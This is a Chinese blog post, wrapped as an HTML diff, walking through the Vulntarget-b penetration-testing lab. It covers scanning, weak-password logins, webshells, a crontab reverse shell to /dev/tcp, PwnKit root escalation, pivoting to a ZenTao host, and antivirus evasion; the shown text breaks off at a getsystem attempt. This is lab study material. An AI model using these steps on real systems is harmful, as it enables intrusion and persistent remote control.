@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulntarget-b | ke1nys`Blog</title><meta name="author" content="ke1nys"><meta name="copyright" content="ke1nys"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="目标ip 192.168.52.128 先使用fscan扫一下 1234567891011121314151617181920212223242526┌──(root㉿kali)-[~]└─# .&#x2F;fscan_amd64 -h 192.168.52.128 -p 1-10000   ___                              _      &#x2F; _ \     ___  ___">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulntarget-b">
+<meta property="og:url" content="https://ke1nys.github.io/posts/cc293b70.html">
+<meta property="og:site_name" content="ke1nys&#96;Blog">
+<meta property="og:description" content="目标ip 192.168.52.128 先使用fscan扫一下 1234567891011121314151617181920212223242526┌──(root㉿kali)-[~]└─# .&#x2F;fscan_amd64 -h 192.168.52.128 -p 1-10000   ___                              _      &#x2F; _ \     ___  ___">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
+<meta property="article:published_time" content="2023-11-23T11:19:00.000Z">
+<meta property="article:modified_time" content="2023-11-23T14:45:25.424Z">
+<meta property="article:author" content="ke1nys">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/zhuzhu.png"><link rel="canonical" href="https://ke1nys.github.io/posts/cc293b70"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulntarget-b',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-11-23 22:45:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/css/runtime/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ke1nys`Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">160</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">125</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ke1nys`Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulntarget-b</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-23T11:19:00.000Z" title="发表于 2023-11-23 19:19:00">2023-11-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-23T14:45:25.424Z" title="更新于 2023-11-23 22:45:25">2023-11-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulntarget-b"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>目标ip 192.168.52.128</p>
+<p>先使用fscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.128 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.128  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.128:81 open</span><br><span class="line">192.168.52.128:80 open</span><br><span class="line">192.168.52.128:888 open</span><br><span class="line">192.168.52.128:22 open</span><br><span class="line">192.168.52.128:21 open</span><br><span class="line">192.168.52.128:3306 open</span><br><span class="line">192.168.52.128:8888 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://192.168.52.128     code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://192.168.52.128:888 code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://192.168.52.128:8888 code:302 len:219    title:Redirecting... 跳转url: http://192.168.52.128:8888/login</span><br><span class="line">[*] WebTitle: http://192.168.52.128:81  code:200 len:14404  title:极致CMS建站系统</span><br><span class="line">[*] WebTitle: http://192.168.52.128:8888/login code:200 len:802    title:安全入口校验失败</span><br></pre></td></tr></table></figure>
+<p>看到8888端口  猜测是宝塔搭建的  去访问这个81端口  是个web服务</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123194702413.png" alt="image-20231123194702413"></p>
+<p>去google一下 发现存在个漏洞  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
+<p>扫一下目录  找后台  网站的那个登录入口时坏的  用不了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">11:06:02] 200 -  479B  - /404.html                                         </span><br><span class="line">[11:06:05] 403 -  548B  - /Public/                                          </span><br><span class="line">[11:06:08] 301 -  162B  - /A  -&gt;  http://192.168.52.128:81/A/               </span><br><span class="line">[11:06:10] 302 -    0B  - /admin.php  -&gt;  http://192.168.52.128:81/admin.php/Login/index.html</span><br><span class="line">[11:06:21] 301 -  162B  - /backup  -&gt;  http://192.168.52.128:81/backup/     </span><br><span class="line">[11:06:21] 403 -  548B  - /backup/                                          </span><br><span class="line">[11:06:23] 301 -  162B  - /cache  -&gt;  http://192.168.52.128:81/cache/       </span><br><span class="line">[11:06:23] 403 -  548B  - /cache/                                           </span><br><span class="line">[11:06:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[11:06:37] 200 -  917B  - /index.html                                       </span><br><span class="line">[11:06:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[11:06:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[11:06:37] 301 -  162B  - /install  -&gt;  http://192.168.52.128:81/install/   </span><br><span class="line">[11:06:37] 200 -   75B  - /install/                                         </span><br><span class="line">[11:06:37] 200 -   75B  - /install/index.php?upgrade/</span><br><span class="line">[11:06:54] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[11:06:55] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[11:06:59] 200 -  495B  - /sitemap.xml                                      </span><br><span class="line">[11:07:00] 301 -  162B  - /static  -&gt;  http://192.168.52.128:81/static/     </span><br><span class="line">[11:07:08] 200 -  816B  - /web.config</span><br></pre></td></tr></table></figure>
+<p>访问admin.php 找到后台管理入口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123   弱口令登录成功</span><br></pre></td></tr></table></figure>
+<p>于是去参考上面给的文章的步骤直接打就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123195043115.png" alt="image-20231123195043115"></p>
+<p>成功写入  连蚁剑进行下一步操作</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123195214018.png" alt="image-20231123195214018"></p>
+<p>发现执行失败  看看是不是存在disable_function</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123195243172.png" alt="image-20231123195243172"></p>
+<p>使用蚁剑插件进行绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123195312397.png" alt="image-20231123195312397"></p>
+<p>挨个试就能试出来的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123195342814.png" alt="image-20231123195342814"></p>
+<p>成功 反弹个shell到攻击机上</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123201958733.png" alt="image-20231123201958733"></p>
+<p>然后写个定时任务   免得shell断了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.129/3389 0&gt;&amp;1&quot; | crontab -  //写定时任务  </span><br><span class="line"></span><br><span class="line">echo $(crontab -l | grep -v &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.129/3389 0&gt;&amp;1&quot;) | crontab -   //删除定时任务</span><br></pre></td></tr></table></figure>
+<p>这里sudo -l  和suid没有发现什么可用于提权的  于是上线viper跑一下看看有没有内核提权</p>
+<p>上传个elf文件运行就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123202610436.png" alt="image-20231123202610436"></p>
+<p>如何跑一下提权exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">set sessions 1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line">[*] 192.168.52.128 - Collecting local exploits for x64/linux...</span><br><span class="line">[*] 192.168.52.128 - 188 exploit checks are being tried...</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/pkexec: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/su_login: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[-] 192.168.52.128 - Post interrupted by the console user</span><br></pre></td></tr></table></figure>
+<p>如何就会发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.</span><br></pre></td></tr></table></figure>
+<p>这个模块可以跑  于是直接上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123203055708.png" alt="image-20231123203055708"></p>
+<p>成功拿到root权限  现在开始查看内网ip  先弹个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.52.128  netmask 255.255.255.0  broadcast 192.168.52.255</span><br><span class="line">        inet6 fe80::6eb2:c966:5aac:35d2  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:f9:82:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 90995  bytes 21146861 (20.1 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 81592  bytes 16363478 (15.6 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens37: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.20.30  netmask 255.255.255.0  broadcast 10.0.20.255</span><br><span class="line">        inet6 fe80::1162:e042:35a0:5cd0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:f9:82:77  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 25  bytes 2701 (2.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 13  bytes 992 (992.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+<p>存在一个内网地址  10.0.20.30 使用fscan扫一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123203905591.png" alt="image-20231123203905591"></p>
+<p>发现扫的时候就扫出来了这个30 就是我们本机自己  于是就猜测是不是内网其他主机开了防火墙</p>
+<p>于是直接扫端口  不ping了  这里的-p 最好是指定固定ip不然会扫的很慢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@bogon tmp]# ./fscan_amd64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379</span><br><span class="line">&lt;md64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379     </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">10.0.20.30:22 open</span><br><span class="line">10.0.20.30:80 open</span><br><span class="line">10.0.20.30:21 open</span><br><span class="line">10.0.20.30:81 open</span><br><span class="line">10.0.20.66:8080 open</span><br><span class="line">10.0.20.30:3306 open</span><br><span class="line">10.0.20.66:3306 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://10.0.20.30         code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://10.0.20.30:81      code:200 len:14380  title:极致CMS建站系统</span><br><span class="line">[*] WebTitle: http://10.0.20.66:8080    code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://10.0.20.66:8080    [禅道] </span><br></pre></td></tr></table></figure>
+<p>这里的话是扫出来了66这个ip  这个ip只开了8080和3306端口</p>
+<p>使用stowaway挂个代理  进去看看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123205036892.png" alt="image-20231123205036892"></p>
+<p>同样是弱口令进行登录  admin/Admin123</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123205917280.png" alt="image-20231123205917280"></p>
+<p>windows机器</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%3C%3D12.4.2%20%E5%90%8E%E5%8F%B0getshell/">禅道漏洞</a></p>
+<p>跟着复现就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip本身是没有的  我们的得自己下来安装</span><br><span class="line"></span><br><span class="line">$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py   # 下载安装脚本</span><br><span class="line">$ sudo python get-pip.py    # 运行安装脚本</span><br></pre></td></tr></table></figure>
+<p>如何就能下载下来pip了  然后使用pip安装pyftpdlib模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -p 24 -d .   //默认开启了匿名</span><br><span class="line"></span><br><span class="line">然后</span><br><span class="line"></span><br><span class="line">ftp://10.0.20.30:24/shell.php</span><br><span class="line"></span><br><span class="line">//这里的用24的原因是21端口已经开了</span><br></pre></td></tr></table></figure>
+<p>然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data/client/1/shell.php   就行了</span><br><span class="line"></span><br><span class="line">//这里我不知道为啥写入的是空的  然后就自己手动加进去了</span><br></pre></td></tr></table></figure>
+<p>然后连蚁剑就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123210412047.png" alt="image-20231123210412047"></p>
+<p>低权限用户  看看能不能提权</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123210446160.png" alt="image-20231123210446160"></p>
+<p>这个东西开了  可以使用土豆提权  先看看进程  看看有没有杀软</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123210552153.png" alt="image-20231123210552153"></p>
+<p>存在火绒  不知道土豆传上去会不会被杀  于是先去github上面找个免杀项目上viper后看看</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p>
+<p>先生成c文件  然后丢进去生成exe文件就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123210918845.png" alt="image-20231123210918845"></p>
+<p>将c文件丢进去就行了   然后上传那个exe文件到机器上运行就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123211801222.png" alt="image-20231123211801222"></p>
+<p>成功上线  因为是土豆提权  那么找个 msf自带的getsystem也是用土豆提权的  所以尝试一下</p>
